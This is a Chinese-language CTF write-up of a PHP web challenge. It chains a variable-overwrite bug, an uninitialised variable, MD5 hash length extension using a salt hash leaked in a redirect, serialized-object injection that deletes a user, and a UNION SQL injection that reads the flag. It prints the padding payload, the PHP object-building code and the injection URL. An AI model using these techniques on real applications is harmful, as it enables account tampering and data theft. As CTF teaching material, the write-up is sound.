

### writeup 
此题目出的真好,硬生生的增长我这菜鸟的一波姿势.
[官方的writeup](http://bobao.360.cn/ctf/detail/173.html)

首先在公共文件 common.php中发现了一个变量覆盖漏洞:
```php
foreach(Array("_POST","_GET","_COOKIE") as $key){
	foreach($$key as $k => $v){
		if(is_array($v)){
		die("hello,hacker!");
		}else{
			$k[0] !='_'?$$k = addslashes($v):$$k = "";
		}
	}
}
```
为啥变量覆盖,不再讲. 这样写理论上是可以重置任意的变量的,但是这个文件是被其他文件在文件最开始引用的,
所以,即便是这里覆盖了,但是在后面的代码会被再次赋值,又被改过来了,没有办法控制变量.

因此这里只能覆盖掉文件中没有经过初始化操作的变量.
最后在riji.php中发现了下面代码:
```php
if($_SESSION['user'])
{
	$username = $_SESSION['user'];
	@mysql_conn();
	$sql = "select * from user where name='$username'";
	$result = @mysql_fetch_array(mysql_query($sql));
	mysql_close();
	if($result['userid'])
	{
		$id = intval($result['userid']);
	}
}
```
我们发现只要在登陆之后,SESSION就会存在,所以会过第一个判断,但是如果用一个用户登陆之后,再删除了这个用户,
它再拿用户名到数据库中查找,显然是找不到的,那么$result['userid']此时为空,导致 $id这个变量没有被初始化,所以这个变量可控.

再往下看:
```php
<?php
				@mysql_conn();
				$sql1 = "select * from msg where userid= $id order by id";
				$query = mysql_query($sql1);
				$result1 = array();
				while($temp=mysql_fetch_assoc($query)) {
					$result1[]=$temp;
				}
				mysql_close();
				foreach($result1 as $x=>$o)
				{
					echo display($o['msg']);
				}
				?>

```
这里进入数据库查询时, $id没有被单引号包裹,所以 addslashes对它不起作用,造成一次注入.

接下来我们就要看怎么删除这个用户了.要利用到api中的接口函数 
在最下面看到,api参数没有初始化:
```php
$a = unserialize(base64_decode($api));
$a->do_method();
```
而且这个文件包含了公共common.php文件,存在变量覆盖漏洞.我们可以控制$a的执行:
跟踪里面的check函数:
```php
function check(){
		$username = addslashes($this->name);//进入数据库的数据进行转义
		@mysql_conn();
		$sql = "select * from user where name='$username'";
		$result = @mysql_fetch_array(mysql_query($sql));
		mysql_close();
		if(!empty($result)){
			//利用 salt 验证是否为该用户
			if($this->check === md5($result['salt'] . $this->data . $username)){
				echo '(=-=)!!';
				if($result['role'] == 1){//检查是否为admin用户
					return 1;
				}
				else{
					return 0;
				}
			}
			else{
				return 0;
			}
		}
		else{
			return 0;
		}
	}
```
我们需要绕过这个判断:
```php
if($this->check === md5($result['salt'] . $this->data . $username))
```
由于admin用户的$result['salt']是随机生成的,我们不知道,所以我们不知道怎么找到一个满足条件的 $check和$data;

但是我们在forget.php中看到了这个:
```php
if($result['salt'])
		{
			$check = base64_encode(md5($result['salt']));
			$name = $result['name'];
			header("Location:/web/repass.php?username=$name&check=$check&mibao=$mibao&pass=$pass");
		}
```
如果我们用admin用户来忘记密码,那么这个302跳转暴露了 base64_encode(md5($result['salt'])),我们知道了 md5($result['salt']).
要求  md5($result['salt'] . $this->data . "admin") 的值,所以这里存在一个哈希扩展攻击.

所以在忘记密码页面输入用户名admin,看到url跳转,抓到  md5($result['salt'])为 eb7a4f270f13c25ed11c7ad939c23dec
然后利用hash长度扩展攻击,利用[这个工具](https://github.com/JoyChou93/md5-extension-attack)
```bash
$python md5pad.py   eb7a4f270f13c25ed11c7ad939c23dec  admin 16 
Payload:  '\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00admin'
Payload urlencode: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80%00%00%00%00%00%00%00admin
md5: 20b7748454ad6a1fa54b3df0778dbd33
```
的到之后,构造如下代码:
```php
<?php 

class admin{
    var $name = "admin";
    var $check= "20b7748454ad6a1fa54b3df0778dbd33";
    var $data = "\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00";
    var $method="del_user";   //要调用的函数  
    var $userid="2";  //要删除的用户  
}
$a = new admin(); 
$api = base64_encode(serialize($a));
echo $api;

```
这里的userid是在用户登陆的时候得到的,
```php
if(@$login==1)
{
	
	@mysql_conn();
	$sql = "select * from user where name='$username'";
	$result = @mysql_fetch_array(mysql_query($sql));
	mysql_close();
	if (!empty($result))
	{
		
		if($result['passwd'] == md5($password))
		{
			$user_cookie = '';
			$user_cookie .= $result['userid'];
			$user_cookie .= $result['name'];
			$user_cookie .= $result['salt'];
			$cookies = base64_encode($user_cookie);
			//$cookies = $user_cookie;
			setcookie("user",$cookies,time()+60,'/web/');
			$_SESSION['login'] = 1;
			$_SESSION['user'] = $username;
			header('Location:/web/riji.php');
```
把 cookie base64解密一下,就看到userid了.

然后把生成的api作为参数传入api.php.注意这里因为进行了登陆转状态的判定,所以要用一个新的隐私窗口发包.
发完之后,会看到删除成功的提示,这时候再去刚才那个用户的riji.php页面,发现还是在登陆状态:
此时我们访问
```
http://xxx/riji.php?id=-1 union select 1,2,flag from flag
```
就看到了flag.
